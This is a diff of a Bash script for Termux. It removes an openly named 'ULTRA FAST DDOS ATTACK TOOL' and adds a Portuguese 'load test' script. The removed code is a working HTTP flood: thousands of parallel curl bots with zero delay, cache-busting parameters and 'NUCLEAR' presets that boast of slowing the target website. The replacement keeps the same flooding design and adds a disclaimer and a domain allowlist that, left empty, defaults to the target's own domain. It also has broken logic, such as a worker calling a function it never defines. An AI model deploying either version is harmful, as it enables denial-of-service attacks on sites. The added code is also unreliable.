@@ -1,477 +1,198 @@
 #!/bin/bash
 
-# ULTRA FAST DDOS ATTACK TOOL
-# Author: Security Researcher
-# Version: 6.0-ULTRA
+# Script de Teste de Carga Agressivo para Termux (APENAS para sites de sua propriedade)
+# Este script foi projetado para testar a capacidade de seus servidores com máximo desempenho,
+# mas de forma segura e legal.  Use com responsabilidade e apenas em ambientes autorizados.
 
-# Colors for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-NC='\033[0m'
+# Definições
+TARGET_URL=""       # Insira o URL do seu site (ex: https://seusite.com)
+NUM_THREADS=50      # Número de threads/processos simultâneos
+REQUEST_TIMEOUT=10  # Timeout em segundos para cada requisição
+DURATION=60         # Duração do teste em segundos
+RATE_LIMIT=0        # Limite de requisições por segundo (0 para desativar)
+LOG_FILE="load_test.log" # Arquivo de log para os resultados
+ALLOWED_DOMAINS=""  # Domínios autorizados (separados por vírgula, ex: seusite.com,outrodominio.com)
+                       # Se vazio, assume o domínio do TARGET_URL
 
-# Banner
-echo -e "${RED}"
-echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗╔═╗╔╦╗"
-echo "    ║ ║╠═╝╠═╝║╣   ║  ║ ║╠═╣╠═╝ ║ "
-echo "    ╚═╝╩  ╩  ╚═╝  ╚═╝╚═╝╩ ╩╩   ╩ "
-echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗"
-echo "    ╠═╣║ ║║ ║║╣   ╠═╣ ║║╠═╣║   ║ "
-echo "    ╩ ╩╚═╝╚═╝╚═╝  ╩ ╩═╩╝╩ ╩╚═╝ ╩ "
-echo -e "${NC}"
-echo -e "${YELLOW}ULTRA FAST DDOS ATTACK TOOL v6.0${NC}"
-echo -e "${RED}MAXIMUM SPEED - USE RESPONSIBLY!${NC}"
-echo ""
+# Variáveis Globais
+TOTAL_REQUESTS=0
+SUCCESSFUL_REQUESTS=0
+FAILED_REQUESTS=0
+START_TIME=$(date +%s)
 
-# Ultra Fast Configuration
-CONFIG_FILE="ultra_ddos.json"
-LOG_FILE="ultra_attack.log"
-STATS_FILE="ultra_stats.json"
+# Funções Utilitárias
 
-# Ultra aggressive configuration
-DEFAULT_CONFIG='{
-    "max_threads": 1000,
-    "max_requests_per_thread": 10000,
-    "max_duration": 1800,
-    "timeout": 3,
-    "connection_timeout": 2,
-    "aggressive_mode": true,
-    "turbo_mode": true,
-    "max_concurrent": 500
-}'
-
-init_config() {
-    if [ ! -f "$CONFIG_FILE" ]; then
-        echo "$DEFAULT_CONFIG" > "$CONFIG_FILE"
-        echo -e "${GREEN}[+] Created ULTRA config file: $CONFIG_FILE${NC}"
-    fi
-}
-
-load_config() {
-    if [ -f "$CONFIG_FILE" ]; then
-        MAX_THREADS=$(jq -r '.max_threads' "$CONFIG_FILE")
-        MAX_REQUESTS_PER_THREAD=$(jq -r '.max_requests_per_thread' "$CONFIG_FILE")
-        MAX_DURATION=$(jq -r '.max_duration' "$CONFIG_FILE")
-        TIMEOUT=$(jq -r '.timeout' "$CONFIG_FILE")
-        CONNECTION_TIMEOUT=$(jq -r '.connection_timeout' "$CONFIG_FILE")
-        AGGRESSIVE_MODE=$(jq -r '.aggressive_mode' "$CONFIG_FILE")
-        TURBO_MODE=$(jq -r '.turbo_mode' "$CONFIG_FILE")
-        MAX_CONCURRENT=$(jq -r '.max_concurrent' "$CONFIG_FILE")
-    else
-        echo -e "${RED}[-] Config file not found${NC}"
-        exit 1
-    fi
-}
-
-# Ultra fast setup
-ultra_setup() {
-    echo -e "${RED}=== ULTRA FAST DDOS SETUP ===${NC}"
-    echo -e "${YELLOW}WARNING: This will generate EXTREME traffic!${NC}"
-    echo ""
-    
-    # Get target URL
-    read -p "Enter target URL: " TARGET_URL
-    if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
-        echo -e "${RED}Invalid URL format!${NC}"
-        return 1
-    fi
-    
-    # Ultra fast preset modes
-    echo ""
-    echo -e "${CYAN}Select ULTRA Attack Mode:${NC}"
-    echo "1. TURBO MODE (500 threads, 0 delay)"
-    echo "2. LIGHTNING MODE (1000 threads, 0 delay)" 
-    echo "3. NUCLEAR MODE (2000 threads, 0 delay)"
-    echo "4. CUSTOM ULTRA"
-    echo ""
-    
-    read -p "Select mode [1-4]: " mode_choice
-    
-    case $mode_choice in
-        1)
-            THREADS=500
-            REQUESTS_PER_THREAD=5000
-            DELAY=0
-            MODE_NAME="TURBO"
-            ;;
-        2)
-            THREADS=1000
-            REQUESTS_PER_THREAD=10000
-            DELAY=0
-            MODE_NAME="LIGHTNING"
-            ;;
-        3)
-            THREADS=2000
-            REQUESTS_PER_THREAD=20000
-            DELAY=0
-            MODE_NAME="NUCLEAR"
-            ;;
-        4)
-            THREADS=$(get_user_input "Threads (recommend 500-5000): " "1000" "number")
-            REQUESTS_PER_THREAD=$(get_user_input "Requests per thread: " "10000" "number")
-            DELAY=0
-            MODE_NAME="CUSTOM ULTRA"
-            ;;
-        *)
-            echo -e "${RED}Invalid, using TURBO MODE${NC}"
-            THREADS=500
-            REQUESTS_PER_THREAD=5000
-            DELAY=0
-            MODE_NAME="TURBO"
-            ;;
-    esac
-    
-    # Ultra fast confirmation
-    echo ""
-    echo -e "${RED}=== ULTRA CONFIRMATION ===${NC}"
-    echo -e "Target: ${RED}$TARGET_URL${NC}"
-    echo -e "Mode: ${RED}$MODE_NAME${NC}"
-    echo -e "Threads: ${RED}$THREADS${NC}"
-    echo -e "Requests: ${RED}$REQUESTS_PER_THREAD${NC}"
-    echo -e "Total: ${RED}$((THREADS * REQUESTS_PER_THREAD)) requests${NC}"
-    echo -e "Delay: ${RED}$DELAY seconds${NC}"
-    echo -e "Timeout: ${RED}$TIMEOUT seconds${NC}"
-    echo ""
-    echo -e "${RED}🚨 THIS WILL GENERATE MASSIVE TRAFFIC! 🚨${NC}"
-    echo ""
-    
-    read -p "Type 'ULTRA_GO' to launch: " confirm
-    if [ "$confirm" != "ULTRA_GO" ]; then
-        echo -e "${YELLOW}[!] Attack cancelled${NC}"
-        return 1
-    fi
-    
-    return 0
-}
-
-# Get user input helper
-get_user_input() {
-    local prompt="$1"
-    local default="$2"
-    local validation="$3"
-    
-    while true; do
-        read -p "$prompt" input
-        input=${input:-$default}
-        
-        if [[ "$validation" == "number" ]]; then
-            if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -gt 0 ]; then
-                echo "$input"
-                break
-            else
-                echo -e "${RED}Please enter a valid number${NC}"
-            fi
-        else
-            echo "$input"
-            break
-        fi
-    done
-}
-
-# Ultra fast request function
-send_ultra_request() {
-    local target="$1"
-    local bot_id="$2"
-    local request_num="$3"
-    
-    # Ultra fast cache busting
-    local cache_bust="cb=${RANDOM}${RANDOM}&t=$(date +%s)&b=${bot_id}&r=${request_num}"
-    if [[ "$target" == *"?"* ]]; then
-        target="${target}&${cache_bust}"
-    else
-        target="${target}?${cache_bust}"
-    fi
-    
-    # Ultra minimal curl command for maximum speed
-    local curl_cmd="curl -s -o /dev/null"
-    curl_cmd="$curl_cmd -H 'User-Agent: Mozilla/5.0'"
-    curl_cmd="$curl_cmd -H 'Accept: text/html'"
-    curl_cmd="$curl_cmd -H 'Connection: close'"  # Close connection immediately for faster cleanup
-    curl_cmd="$curl_cmd -m $TIMEOUT"  # Maximum time for entire request
-    curl_cmd="$curl_cmd --connect-timeout $CONNECTION_TIMEOUT"  # Faster connection timeout
-    curl_cmd="$curl_cmd --max-time $TIMEOUT"
-    curl_cmd="$curl_cmd -w '%{http_code}'"  # Only get HTTP code for maximum speed
-    curl_cmd="$curl_cmd '$target' 2>/dev/null"
-    
-    local start_time=$(date +%s%3N)
-    local http_code=$(eval $curl_cmd)
-    local end_time=$(date +%s%3N)
-    local duration=$((end_time - start_time))
-    
-    # Ultra fast logging (minimal disk I/O)
-    if [ -n "$http_code" ]; then
-        echo "$(date '+%H:%M:%S'),$bot_id,$request_num,$http_code,$duration" >> "$LOG_FILE"
-        update_ultra_stats "$http_code" "$duration"
-        
-        # Fast progress indicator (only show every 100 requests per thread)
-        if [ $((request_num % 100)) -eq 0 ]; then
-            if [[ "$http_code" =~ ^[2-3][0-9][0-9]$ ]]; then
-                echo -e "${GREEN}[$bot_id:$request_num] $http_code${NC}"
-            elif [[ "$http_code" =~ ^[5][0-9][0-9]$ ]]; then
-                echo -e "${RED}[$bot_id:$request_num] $http_code 💥${NC}"
-            else
-                echo -e "${YELLOW}[$bot_id:$request_num] $http_code${NC}"
-            fi
-        fi
-    else
-        echo "$(date '+%H:%M:%S'),$bot_id,$request_num,TIMEOUT,$duration" >> "$LOG_FILE"
-        update_ultra_stats "TIMEOUT" "$duration"
-    fi
-}
-
-# Ultra fast bot
-ultra_bot() {
-    local bot_id="$1"
-    local target="$2"
-    
-    # Use sequence for faster iteration
-    for i in $(seq 1 $REQUESTS_PER_THREAD); do
-        if [ $STOP_ATTACK -eq 1 ]; then
-            break
-        fi
-        send_ultra_request "$target" "$bot_id" "$i"
-    done
-}
-
-# Fast stats update
-update_ultra_stats() {
-    local http_code="$1"
-    local duration="$2"
-    
-    if [ ! -f "$STATS_FILE" ]; then
-        cat > "$STATS_FILE" << EOF
-{
-    "total_requests": 0,
-    "successful_requests": 0,
-    "failed_requests": 0,
-    "error_requests": 0,
-    "start_time": "$(date '+%Y-%m-%d %H:%M:%S')",
-    "last_update": "$(date '+%Y-%m-%d %H:%M:%S')"
-}
-EOF
-    fi
-    
-    # Fast stats update without jq (using simple counters)
-    local stats=$(cat "$STATS_FILE")
-    local total_requests=$(echo "$stats" | grep -o '"total_requests":[0-9]*' | cut -d: -f2)
-    total_requests=$((total_requests + 1))
-    
-    # Update stats file quickly
-    cat > "$STATS_FILE" << EOF
-{
-    "total_requests": $total_requests,
-    "successful_requests": $((echo "$stats" | grep -o '"successful_requests":[0-9]*' | cut -d: -f2)),
-    "failed_requests": $((echo "$stats" | grep -o '"failed_requests":[0-9]*' | cut -d: -f2)),
-    "error_requests": $((echo "$stats" | grep -o '"error_requests":[0-9]*' | cut -d: -f2)),
-    "start_time": "$(echo "$stats" | grep -o '"start_time":"[^"]*"' | cut -d'"' -f4)",
-    "last_update": "$(date '+%Y-%m-%d %H:%M:%S')"
-}
-EOF
-}
-
-# Show ultra stats
-show_ultra_stats() {
-    if [ -f "$STATS_FILE" ]; then
-        local stats=$(cat "$STATS_FILE")
-        local total_requests=$(echo "$stats" | grep -o '"total_requests":[0-9]*' | cut -d: -f2)
-        local start_time=$(echo "$stats" | grep -o '"start_time":"[^"]*"' | cut -d'"' -f4)
-        
-        local current_time=$(date +%s)
-        local start_seconds=$(date -d "$start_time" +%s 2>/dev/null || date +%s)
-        local elapsed=$((current_time - start_seconds))
-        
-        local rps=0
-        if [ $elapsed -gt 0 ]; then
-            rps=$((total_requests / elapsed))
-        fi
-        
-        echo ""
-        echo -e "${RED}=== ULTRA STATS ===${NC}"
-        echo -e "Total Requests: ${CYAN}$total_requests${NC}"
-        echo -e "Elapsed Time: ${YELLOW}${elapsed}s${NC}"
-        echo -e "Requests/Sec: ${GREEN}$rps${NC}"
-        echo -e "Active Threads: ${BLUE}$THREADS${NC}"
-        
-        if [ $rps -lt 100 ]; then
-            echo -e "Speed: ${YELLOW}SLOW - Increase threads${NC}"
-        elif [ $rps -lt 500 ]; then
-            echo -e "Speed: ${GREEN}MEDIUM${NC}"
-        elif [ $rps -lt 1000 ]; then
-            echo -e "Speed: ${BLUE}FAST${NC}"
-        else
-            echo -e "Speed: ${RED}ULTRA FAST!${NC}"
-        fi
-    fi
-}
-
-# Launch ultra attack
-launch_ultra_attack() {
-    if ! ultra_setup; then
-        return 1
-    fi
-    
-    echo -e "${RED}[+] LAUNCHING ULTRA ATTACK...${NC}"
-    echo -e "${YELLOW}[!] Target: $TARGET_URL${NC}"
-    echo -e "${YELLOW}[!] Mode: $MODE_NAME${NC}"
-    echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}"
-    
-    # Minimal log header
-    echo "time,bot_id,req_num,http_code,duration" > "$LOG_FILE"
-    rm -f "$STATS_FILE"
-    
-    local start_time=$(date +%s)
-    STOP_ATTACK=0
-    
-    trap 'STOP_ATTACK=1; echo -e "\n${YELLOW}[!] Stopping...${NC}"' SIGINT SIGTERM
-    
-    # Fast monitor
-    (
-        while [ $STOP_ATTACK -eq 0 ]; do
-            clear
-            show_ultra_stats
-            echo -e "\n${RED}[!] ULTRA ATTACK IN PROGRESS...${NC}"
-            echo -e "${YELLOW}[!] Press Ctrl+C to stop${NC}"
-            sleep 2
-        done
-    ) &
-    local monitor_pid=$!
-    
-    # Launch ultra bot army
-    local pids=()
-    echo -e "${GREEN}[+] Starting $THREADS attack threads...${NC}"
-    
-    for i in $(seq 1 $THREADS); do
-        ultra_bot "$i" "$TARGET_URL" &
-        pids+=($!)
-        
-        # Stagger startup to avoid overwhelming system
-        if [ $((i % 100)) -eq 0 ]; then
-            sleep 0.1
-        fi
-    done
-    
-    echo -e "${GREEN}[+] All threads launched! Monitoring...${NC}"
-    
-    # Wait for completion or interrupt
-    while [ $STOP_ATTACK -eq 0 ]; do
-        sleep 1
-        # Check if all threads are done
-        local running=0
-        for pid in "${pids[@]}"; do
-            if kill -0 "$pid" 2>/dev/null; then
-                running=1
-                break
-            fi
-        done
-        if [ $running -eq 0 ]; then
-            break
-        fi
-    done
-    
-    STOP_ATTACK=1
-    kill $monitor_pid 2>/dev/null
-    
-    # Cleanup
-    for pid in "${pids[@]}"; do
-        wait $pid 2>/dev/null
-    done
-    
-    local end_time=$(date +%s)
-    local total_duration=$((end_time - start_time))
-    
-    echo -e "${GREEN}[+] ULTRA attack completed!${NC}"
-    echo -e "Duration: ${YELLOW}${total_duration}s${NC}"
-    show_ultra_stats
-    
-    # Final speed calculation
-    if [ -f "$STATS_FILE" ]; then
-        local total_requests=$(cat "$STATS_FILE" | grep -o '"total_requests":[0-9]*' | cut -d: -f2)
-        local rps=$((total_requests / total_duration))
-        
-        echo ""
-        echo -e "${RED}=== FINAL SPEED ANALYSIS ===${NC}"
-        echo -e "Total Requests: ${CYAN}$total_requests${NC}"
-        echo -e "Total Duration: ${YELLOW}${total_duration}s${NC}"
-        echo -e "Average RPS: ${GREEN}$rps requests/second${NC}"
-        
-        if [ $rps -gt 1000 ]; then
-            echo -e "${RED}🎉 EXTREME PERFORMANCE! Website should be feeling this!${NC}"
-        elif [ $rps -gt 500 ]; then
-            echo -e "${GREEN}🚀 GREAT PERFORMANCE! Significant load generated.${NC}"
-        elif [ $rps -gt 100 ]; then
-            echo -e "${YELLOW}⚡ GOOD PERFORMANCE! Website should be slowing down.${NC}"
-        else
-            echo -e "${BLUE}ℹ MODERATE PERFORMANCE - Try increasing threads${NC}"
-        fi
-    fi
-}
-
-# Simple main menu
-main_menu() {
-    while true; do
-        clear
-        echo -e "${RED}"
-        echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔═╗╔═╗╔═╗╔╦╗"
-        echo "    ║ ║╠═╝╠═╝║╣   ║  ║ ║╠═╣╠═╝ ║ "
-        echo "    ╚═╝╩  ╩  ╚═╝  ╚═╝╚═╝╩ ╩╩   ╩ "
-        echo "    ╔═╗╔═╗╔═╗╔═╗  ╔═╗╔╦╗╔═╗╔═╗╔╦╗"
-        echo "    ╠═╣║ ║║ ║║╣   ╠═╣ ║║╠═╣║   ║ "
-        echo "    ╩ ╩╚═╝╚═╝╚═╝  ╩ ╩═╩╝╩ ╩╚═╝ ╩ "
-        echo -e "${NC}"
-        echo -e "${YELLOW}ULTRA FAST DDOS ATTACK TOOL v6.0${NC}"
-        echo ""
-        echo -e "${CYAN}=== MAIN MENU ===${NC}"
-        echo "1. Launch ULTRA Attack"
-        echo "2. Quick Stats"
-        echo "3. Exit"
-        echo ""
-        
-        read -p "Select option [1-3]: " choice
-        
-        case $choice in
-            1)
-                launch_ultra_attack
-                read -p "Press Enter to continue..."
-                ;;
-            2)
-                if [ -f "$STATS_FILE" ]; then
-                    show_ultra_stats
-                else
-                    echo -e "${RED}No stats available${NC}"
-                fi
-                read -p "Press Enter to continue..."
-                ;;
-            3)
-                echo -e "${GREEN}[+] Tool closed${NC}"
-                exit 0
-                ;;
-            *)
-                echo -e "${RED}Invalid option${NC}"
-                sleep 1
-                ;;
-        esac
-    done
-}
-
-# Check dependencies
-check_dependencies() {
-    if ! command -v curl >/dev/null; then
-        echo -e "${RED}[-] curl is required${NC}"
-        echo -e "${YELLOW}[!] Install with: pkg install curl${NC}"
-        return 1
-    fi
-    return 0
-}
-
-# Main execution
-init_config
-load_config
-
-if check_dependencies; then
-    main_menu
-else
+# Validação do alvo
+validate_target() {
+  if [ -z "$TARGET_URL" ]; then
+    echo "ERRO: URL do alvo não especificado.  Defina TARGET_URL."
     exit 1
-fi
+  fi
+
+  if [ -z "$ALLOWED_DOMAINS" ]; then
+    ALLOWED_DOMAINS=$(echo "$TARGET_URL" | awk -F'//' '{print $2}' | awk -F'/' '{print $1}')
+    echo "AVISO: ALLOWED_DOMAINS não especificado. Assumindo domínio de TARGET_URL: $ALLOWED_DOMAINS"
+  fi
+
+  target_domain=$(echo "$TARGET_URL" | awk -F'//' '{print $2}' | awk -F'/' '{print $1}')
+
+  allowed=false
+  for domain in $(echo "$ALLOWED_DOMAINS" | tr "," "\n"); do
+    if [ "$target_domain" == "$domain" ]; then
+      allowed=true
+      break
+    fi
+  done
+
+  if ! $allowed; then
+    echo "ERRO: Alvo ($TARGET_URL) não está na lista de domínios autorizados ($ALLOWED_DOMAINS).  Teste abortado."
+    exit 1
+  fi
+}
+
+# Geração de User-Agent aleatório
+random_user_agent() {
+  local agents=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
+  )
+  echo "${agents[$((RANDOM % ${#agents[@]}))]}"
+}
+
+# Cache busting (adiciona um parâmetro aleatório à URL)
+cache_busting_url() {
+  echo "$TARGET_URL?cachebuster=$(date +%s%N)"
+}
+
+# Função principal para realizar as requisições
+perform_request() {
+  local url=$(cache_busting_url)
+  local user_agent=$(random_user_agent)
+  local start=$(date +%s%N)
+
+  # Seleciona um método HTTP aleatório
+  local methods=("GET" "POST" "HEAD" "PUT")
+  local method="${methods[$((RANDOM % ${#methods[@]}))]}"
+
+  curl -s -w "%{http_code} %{time_total}" \
+       -H "User-Agent: $user_agent" \
+       -H "Connection: keep-alive" \
+       -X "$method" \
+       --max-time $REQUEST_TIMEOUT \
+       "$url" 2>&1 | while read -r line; do
+    local status_code=$(echo "$line" | awk '{print $1}')
+    local response_time=$(echo "$line" | awk '{print $2}')
+
+    ((TOTAL_REQUESTS++))
+
+    if [[ "$status_code" =~ ^[23] ]]; then  # Considera 2xx e 3xx como sucesso
+      ((SUCCESSFUL_REQUESTS++))
+    else
+      ((FAILED_REQUESTS++))
+    fi
+
+    local end=$(date +%s%N)
+    local duration=$((end - start))
+
+    echo "$(date +%Y-%m-%d\ %H:%M:%S) - URL: $url, Method: $method, Status: $status_code, Time: $response_time seconds" >> "$LOG_FILE"
+  done
+}
+
+# Função para monitoramento em tempo real e estatísticas
+monitor_stats() {
+  while true; do
+    sleep 1
+    local now=$(date +%s)
+    local elapsed=$((now - START_TIME))
+
+    if [ "$elapsed" -ge "$DURATION" ]; then
+      echo "Tempo limite atingido.  Finalizando teste."
+      break
+    fi
+
+    local req_per_sec=$((TOTAL_REQUESTS / elapsed))
+    local success_rate=$((SUCCESSFUL_REQUESTS * 100 / TOTAL_REQUESTS))
+    local fail_rate=$((FAILED_REQUESTS * 100 / TOTAL_REQUESTS))
+
+    echo "--------------------------------------------------"
+    echo "Tempo decorrido: $elapsed / $DURATION segundos"
+    echo "Requisições totais: $TOTAL_REQUESTS"
+    echo "Requisições por segundo: $req_per_sec"
+    echo "Sucesso: $SUCCESSFUL_REQUESTS ($success_rate%)"
+    echo "Falha: $FAILED_REQUESTS ($fail_rate%)"
+    echo "--------------------------------------------------"
+
+  done
+  killall -q -w bash_load_worker.sh  # Encerra os workers
+  exit 0
+}
+
+# Disclaimer Legal
+disclaimer() {
+  echo "--------------------------------------------------"
+  echo "AVISO LEGAL:"
+  echo "Este script deve ser usado APENAS para testar sites de sua propriedade"
+  echo "com permissão explícita.  O uso indevido é ilegal e antiético."
+  echo "O autor não se responsabiliza por quaisquer danos causados pelo uso deste script."
+  echo "--------------------------------------------------"
+}
+
+# Confirmação do Usuário
+confirm_execution() {
+  read -r -p "Você confirma que possui permissão para testar o site $TARGET_URL? (s/n) " response
+  case "$response" in
+    [Ss]* )
+      echo "Iniciando teste de carga..."
+      ;;
+    [Nn]* )
+      echo "Teste abortado."
+      exit 1
+      ;;
+    * )
+      echo "Resposta inválida. Teste abortado."
+      exit 1
+      ;;
+  esac
+}
+
+# Script worker para cada thread
+cat > bash_load_worker.sh <<EOF
+#!/bin/bash
+
+while true; do
+  perform_request
+  if [ "$RATE_LIMIT" -gt 0 ]; then
+    sleep 1/$RATE_LIMIT  # Limita a taxa de requisições
+  fi
+done
+EOF
+chmod +x bash_load_worker.sh
+
+# Função principal para iniciar o teste
+main() {
+  disclaimer
+  validate_target
+  confirm_execution
+
+  echo "Iniciando teste de carga em $TARGET_URL com $NUM_THREADS threads durante $DURATION segundos..."
+  echo "Resultados serão registrados em $LOG_FILE"
+
+  # Inicia o monitoramento em background
+  monitor_stats &
+
+  # Inicia os threads/processos em background
+  for ((i=1; i<=$NUM_THREADS; i++)); do
+    ./bash_load_worker.sh &
+  done
+
+  wait  # Aguarda a finalização de todos os processos filhos (monitor_stats e workers)
+
+  echo "Teste de carga finalizado."
+  echo "Resultados detalhados em $LOG_FILE"
+}
+
+# Inicia o script
+main
